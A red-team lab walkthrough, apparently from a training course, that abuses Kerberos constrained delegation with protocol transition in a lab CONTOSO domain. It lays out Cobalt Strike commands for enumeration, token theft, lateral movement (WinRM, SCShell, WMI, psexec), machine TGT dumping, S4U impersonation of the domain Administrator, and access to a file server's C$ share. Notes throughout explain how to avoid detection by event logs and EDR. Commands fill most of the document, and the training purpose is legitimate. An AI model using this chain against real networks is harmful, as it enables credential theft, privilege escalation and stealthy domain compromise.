# Constrained Delegation (with protocol transition) Lab

>The objective of this lab is to abuse constrained delegation with protocol transition to obtain access to a back-end service.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Search for computers whose *msDS-AllowedToDelegateTo* attribute is not null.
  
    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
    ```

⚠️ This should return *lon-ws-1$*, which is permitted to delegate to *cifs/lon-fs-1*.

3. Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.

    ```Terminal-nocolor
    [Convert]::ToBoolean(16781312 -band 16777216)
    ```

⚠️ This should return *True*.

4. Move laterally to *lon-ws-1* — you need a SYSTEM beacon on that host to dump its machine account TGT.

> **Why SYSTEM on lon-ws-1?** The constrained delegation abuse in the next phase requires the lon-ws-1$ machine account TGT (LUID `0x3e7`). Only SYSTEM can read the machine account's Kerberos session. A user-context beacon is not sufficient.

**Step A — Impersonate rsteel (Workstation Admin on lon-ws-1)**

```cs
beacon> ps                              // find rsteel process — look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
beacon> steal_token <rsteel-pid>        // OPSEC-🟢SAFE — token dup in-process, no Event 4648
```

If rsteel has no running process, use TGT injection:

```cs
beacon> krb_triage                              // confirm rsteel TGT cached
beacon> krb_dump /user:rsteel /service:krbtgt   // OPSEC-🟢SAFE BOF dump
beacon> make_token CONTOSO\rsteel FakePass      // OPSEC-🟠CAUTION — Event 4648
beacon> kerberos_ticket_use <base64-tgt>        // inject TGT in-memory
```

**Step B — Jump to lon-ws-1 (try in order, stop at first success)**

```cs
// Option 1 — WinRM (OPSEC-🟢SAFE — preferred, no service, no Event 7045)
beacon> powerpick Test-WSMan lon-ws-1           // verify WinRM reachable first
beacon> jump winrm64 lon-ws-1 smb              // injects into wsmprovhost.exe
// If beacon dies immediately → Elastic Endpoint killing auto-generated payload → use Option 2

// Option 2 — SCShell (OPSEC-🟠CAUTION — modifies existing service path, Event 7040, no Event 7045)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 lon-ws-1 smb

// Option 3 — Pre-staged payload upload (when EDR catches auto-generated jump payloads)
beacon> upload C:\Payloads\smb_x64.exe          // upload custom-built payload via C2 channel
beacon> remote-exec winrm lon-ws-1 C:\Windows\Temp\smb_x64.exe
beacon> rm C:\Windows\Temp\smb_x64.exe         // clean up after beacon checks in

// Option 4 — WMI exec (OPSEC-🟠CAUTION — no service, Event 4688 on target)
beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\smb_x64.exe

// Option 5 — psexec (OPSEC-🔴UNSAFE — LAST RESORT — Event 7045 new service)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump psexec64 lon-ws-1 smb
```

```cs
beacon> rev2self                                // drop rsteel token on original beacon
```

**Step C — Escalate to SYSTEM on lon-ws-1 beacon**

The new beacon lands as `CONTOSO\rsteel`. You need SYSTEM to read `lon-ws-1$` machine account TGT:

```cs
// New beacon on lon-ws-1:
beacon> getuid                                  // confirm rsteel context
beacon> steal_token <SYSTEM-pid>               // steal token from any SYSTEM process (e.g. svchost.exe)
beacon> getuid                                  // confirm NT AUTHORITY\SYSTEM
```

===

## Exploitation

1. Dump the TGT for *lon-ws-1* computer and observe the hex LUID is `3x7`  

    ```Beacon-nocolor
    krb_triage
    krb_dump /luid:3e7 /service:krbtgt
    ```

2. Perform the S4U abuse to obtain a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain admin.
  
    ```Beacon-nocolor
    krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
    
    krb_describe /ticket:[base64]
    ```

3. Use the S4U ticket to access the C$ share on *lon-fs-1* as Administrator.

> The S4U ticket is for `cifs/lon-fs-1` impersonating `Administrator` — inject it into a sacrificial logon session and access the share directly. No need to know Administrator's password.

```cs
// Step 1 — Create sacrificial logon session (OPSEC-🟠CAUTION — Event 4648)
beacon> make_token CONTOSO\Administrator FakePass!
// Password is irrelevant — the S4U ticket provides the actual Kerberos auth

// Step 2 — Save the S4U ticket kirbi to attacker desktop (run in attacker PowerShell, NOT beacon)
```

On the Attacker Desktop PowerShell (not in beacon — avoids child process):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64 TICKET from krb_s4u output]"))
```

Back in beacon:

```cs
// Step 3 — Inject S4U ticket into the logon session (OPSEC-🟠CAUTION)
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi

// Step 4 — Verify access (OPSEC-🟢SAFE — built-in beacon command, no child process)
beacon> ls \\lon-fs-1\c$
// Expected: directory listing of lon-fs-1 C$ — confirms Administrator-level CIFS access

// Step 5 — Clean up
beacon> rev2self                        // drop Administrator impersonation
beacon> kerberos_ticket_purge           // purge injected ticket from session
```

> **If `ls \\lon-fs-1\c$` returns Access Denied:** The S4U ticket may have been issued for the wrong SPN format. Check `krb_describe` output — ensure `ServiceName` shows `cifs/lon-fs-1` not `cifs/lon-fs-1.contoso.com`. Re-run `krb_s4u` with the matching SPN format to what the DC returned in step 2.

⚠️ In this lab, you have learned how to abuse constrained delegation (with protocol transition) to impersonate any user to the delegated service.
